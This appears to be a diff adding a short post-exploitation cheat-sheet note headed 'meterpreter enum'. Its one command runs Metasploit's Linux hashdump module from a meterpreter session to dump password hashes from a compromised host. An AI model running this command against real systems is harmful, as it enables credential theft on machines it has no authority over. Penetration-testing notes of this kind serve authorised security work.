@@ -1,0 +1,4 @@
+### meterpreter enum ###
+
+## HASH DUMP
+meterpreter > run post/linux/gather/hashdump
